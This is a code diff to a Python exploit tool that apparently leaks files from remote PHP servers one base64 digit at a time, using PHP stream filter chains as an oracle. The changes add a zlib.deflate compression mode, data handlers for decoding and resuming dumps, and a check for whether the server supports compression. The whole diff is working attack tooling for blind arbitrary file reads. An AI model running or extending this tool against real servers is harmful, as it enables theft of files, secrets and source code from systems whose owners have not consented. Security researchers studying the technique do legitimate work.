@@ -11,6 +11,7 @@ To use, implement the `Remote.oracle()` method in `remote.py`.
 """
 
 from __future__ import annotations
+from abc import abstractmethod
 from functools import cache, cached_property
 from itertools import product
 from dataclasses import dataclass, field
@@ -60,6 +61,10 @@ B64DE = (
     "output",
     "Path to the output file. If not set, the file is not stored. If set, and the file already exists, the dump will resume from where it stopped.",
 )
+@arg(
+    "compress",
+    "If set, the file is retrieved in a compressed format, which is then decompressed before being dumped. This is faster, but it requires PHP to have the `zlib` extension enabled, and it displays data in chunks instead of character by character.",
+)
 @arg("workers", "Number of workers. Defaults to 2.")
 @arg("silent", "If set, do not display the file as it is being dumped")
 @arg("debug", "If set, writes logs to debug.log")
@@ -75,14 +80,24 @@ class Exploit:
         "convert.base64-encode",
         REMOVE_EQUAL,
     )
+    handler: DataHandler
 
     def __init__(
-        self, path: str, output: str = None, workers: int=2, silent: bool = False, debug: bool = False
+        self,
+        path: str,
+        output: str = None,
+        compress: bool = False,
+        workers: int=2, silent: bool = False,
+        debug: bool = False,
     ) -> None:
         self.path = path
         self.output = output
         self.nb_workers = workers
         self.debug = debug
+        if compress:
+            self.data_handler = ZlibCompressedDataHandler(self)
+        else:
+            self.data_handler = RawDataHandler(self)
         self.remote = Remote()
         self.digits = [BaseDigit()]
         self._display = not silent
@@ -98,13 +113,12 @@ class Exploit:
         self._write_output()
 
     def _handle_resume(self) -> None:
-        data = Path(self.output).read_bytes()
-        data = base64.encode(data)
-        if data.endswith("=="):
-            data = data[:-3]
-        elif data.endswith("="):
-            data = data[:-2]
-        msg_warning(f"File exists, resuming dump at digit [b]#{len(data)}[/]")
+        data = self.data_handler.resume(self.output)
+
+        if not data:
+            return
+
+        msg_info(f"File exists, resuming dump at digit [b]#{len(data)}[/]")
 
         for digit in data:
             self.digits.append(PositionalDigit(len(self.digits), digit))
@@ -137,23 +151,20 @@ class Exploit:
         return possible_digits
 
     def oracle(self, filters: list[str]) -> bool:
+        filters = self.data_handler.edit_filters(filters)
         return self.remote.has_contents(filters, self.path)
 
-    def _nb_dumped_bytes(self) -> int:
-        return (len(self.digits) - 1) // 4 * 3
-
     def data_string(self) -> str:
-        data = self.base64_string()
-        data += "A" * (4 - len(data) % 4)
-        data = base64.decode(data)
-        data = data.decode("utf-8", "replace")
-        return data
+        base64_string = self.base64_string()
+        return self.data_handler.for_display(base64_string)
 
     def _get_renderable(self) -> Group:
-        nb_bytes = self._nb_dumped_bytes()
-        prefix = f"[black b]>>[/] [u]Dumping [b]{self.path}[/b][/] (got [i]{nb_bytes}[/i] bytes)"
+        nb_digits = len(self.digits) - 1
+        string = self.data_string()
+        nb_chars = len(string)
 
-        return Group(Text(self.data_string()), prefix.format(nb_bytes=nb_bytes))
+        prefix = f"[black b]>>[/] [u]Dumping [b]{self.path}[/b][/] (got [i]{nb_digits}[/i] digits, [i]{nb_chars}[/i] chars)"
+        return Group(Text(string), prefix)
 
     def _test_remote(self) -> None:
         """Tests that the remote class created by the user is working properly."""
@@ -173,6 +184,28 @@ class Exploit:
                 msg_info(f"This should be true: {should_be_true}")
         else:
             msg_success("The remote class is working [b]properly[/]!")
+
+        # Testing if zlib.deflate is supported by the remote server
+        # We try to compress an empty string: if zlib.deflate is not supported, the
+        # remote server will yield an error and return an empty string. If it is, it
+        # will yield a few bytes. The additional base64-encode is to ensure that
+        # the output is ASCII, and we don't encounter unexpected issues with decoding or
+        # anything.
+        should_be_true = self.remote.has_contents(
+            ("zlib.deflate", "convert.base64-encode"), "data:,"
+        )
+
+        if not should_be_true:
+            msg_warning(
+                "The remote class [b]does not support[/] zlib.deflate, which is required for "
+                "compressed dumps."
+            )
+        else:
+            msg_success(
+                "The remote class [b]supports[/] zlib.deflate, which is required for "
+                "compressed dumps."
+            )
+            msg_success("Use [code]-c[/] to enable compression.")
 
         leave()
 
@@ -266,32 +299,22 @@ class Exploit:
                 live.stop()
 
         if self._display:
-            msg_print(Text(self.data_string()))
+            data = self.data_string()
+            msg_print(Text(data))
 
         if interrupted:
             msg_failure("Execution interrupted (Ctrl-C)")
 
-        nb_bytes = self._nb_dumped_bytes()
         output = f" to [b]{self.output}[/]" if self.output else ""
-        msg_success(f"Dumped [b]{self.path}[/]{output} (got [i]{nb_bytes}[/] bytes)")
+        msg_success(f"Dumped [b]{self.path}[/]{output}")
 
     def _write_output(self) -> None:
         if not self.output:
             return
 
         data = self.base64_string()
+        data = self.data_handler.for_output(data)
 
-        match len(data) % 4:
-            case 0:
-                pass
-            case 1:
-                data += "A=="
-            case 2:
-                data += "=="
-            case 3:
-                data += "="
-
-        data = base64.decode(data)
         self._handle.seek(0)
         self._handle.write(data)
         self._handle.flush()
@@ -904,6 +927,93 @@ class BaseJumpDescription(JumpDescription):
 
     def update_breakable(self, p: int, digit: Digit) -> None:
         pass
+
+
+@dataclass
+class DataHandler:
+    exploit: Exploit
+
+    @abstractmethod
+    def edit_filters(self, filters: list[str]) -> list[str]:
+        """Adds filters to the filter chain."""
+
+    @abstractmethod
+    def for_output(self, data: str) -> bytes:
+        """Returns the data as bytes for it to be stored to a file."""
+
+    @abstractmethod
+    def for_display(self, data: str) -> str:
+        """Returns the data as a string, for it to be displayed."""
+
+    @abstractmethod
+    def resume(self, path: str) -> str:
+        """Returns the base64 digits of the data that has already been dumped."""
+
+
+@dataclass
+class RawDataHandler(DataHandler):
+    def edit_filters(self, filters: tuple[str]) -> tuple[str]:
+        return filters
+
+    def for_output(self, data: str) -> bytes:
+        match len(data) % 4:
+            case 0:
+                pass
+            case 1:
+                data += "A=="
+            case 2:
+                data += "=="
+            case 3:
+                data += "="
+
+        data = base64.decode(data)
+        return data
+
+    def for_display(self, data: str) -> str:
+        data += "A" * (4 - len(data) % 4)
+        data = base64.decode(data)
+        data = data.decode("utf-8", "replace")
+        return data
+
+    def resume(self, path: str) -> str:
+        data = Path(path).read_bytes()
+        data = base64.encode(data)
+        if data.endswith("=="):
+            data = data[:-3]
+        elif data.endswith("="):
+            data = data[:-2]
+        return data
+
+
+@dataclass
+class ZlibCompressedDataHandler(DataHandler):
+    GZ_B64_EXT = ".gz.b64"
+
+    def edit_filters(self, filters: tuple[str]) -> tuple[str]:
+        return ("zlib.deflate",) + filters
+
+    def for_output(self, data: str) -> bytes:
+        if self.exploit.output:
+            Path(self.exploit.output + self.GZ_B64_EXT).write_text(data)
+
+        remove_offset = len(data) - (len(data) % 4)
+        data = data[:remove_offset]
+
+        data = base64.decode(data)
+        obj = zlib.decompressobj(-zlib.MAX_WBITS)
+        try:
+            data = obj.decompress(data)
+        except zlib.error as e:
+            log.error(f"Decompression error", exc_info=True)
+            data = b"<unable to decompress>"
+        return data
+
+    def for_display(self, data: str) -> str:
+        return self.for_output(data).decode("utf-8", "replace")
+
+    def resume(self, path: str) -> str:
+        data = Path(path + self.GZ_B64_EXT).read_text()
+        return data
 
 
 def fc(filters: list[str]) -> str:
